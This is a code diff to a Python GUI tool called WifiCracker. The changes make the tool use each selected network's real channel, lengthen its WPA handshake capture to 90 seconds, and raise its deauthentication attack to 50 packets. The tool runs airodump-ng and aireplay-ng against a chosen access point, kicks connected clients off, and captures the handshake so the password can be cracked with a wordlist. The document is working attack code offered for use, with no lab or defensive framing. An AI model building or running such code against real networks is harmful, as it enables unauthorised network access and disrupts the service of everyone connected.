@@ -11,7 +11,7 @@ from PyQt5.QtWidgets import (
 )
 from PyQt5.QtCore import Qt, pyqtSignal, QObject
 
-# Logger class to safely update GUI from threads
+
 class Logger(QObject):
     log_signal = pyqtSignal(str)
 
@@ -36,7 +36,7 @@ class WifiCracker(QWidget):
         self.networks_seen = {}
         self.scan_thread = None
 
-        # Logger system
+        
         self.logger = Logger()
         self.logger.log_signal.connect(self.append_log)
 
@@ -187,8 +187,12 @@ class WifiCracker(QWidget):
     def network_selected(self, row, col):
         essid = self.table.item(row, 0).text()
         bssid = self.table.item(row, 1).text()
-        channel = "6"
+        if bssid in self.networks_seen:
+            _, channel, _ = self.networks_seen[bssid]
+        else:
+            channel = "6"  
         self.selected_network = (essid, bssid, channel)
+        self.target_label.setText(f"Target: {essid} ({bssid}) CH: {channel}")
         self.stack.setCurrentWidget(self.wordlist_screen)
 
     # ================= SCREEN 4 =================
@@ -257,15 +261,16 @@ class WifiCracker(QWidget):
         subprocess.call(["iwconfig", iface, "channel", channel])
 
         capture_file = "/tmp/handshake"
-        self.logger.log_signal.emit("[+] Starting to capture handshake...")
+        self.logger.log_signal.emit("[+] Starting to capture handshake for 90 seconds...")
         proc = subprocess.Popen(["airodump-ng", "-c", channel, "--bssid", bssid, "-w", capture_file, iface],
                                 stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-        time.sleep(5)
-        self.logger.log_signal.emit("[+] Sending Deauth packets...")
-        subprocess.call(["aireplay-ng", "--deauth", "10", "-a", bssid, iface], stdout=subprocess.DEVNULL)
+        # Increased capture duration
+        time.sleep(90)
 
-        time.sleep(8)
+        self.logger.log_signal.emit("[+] Sending Deauth packets...")
+        subprocess.call(["aireplay-ng", "-0", "50", "-a", bssid, iface], stdout=subprocess.DEVNULL)
+
         self.logger.log_signal.emit("[+] Stop capturing...")
         proc.terminate()
 
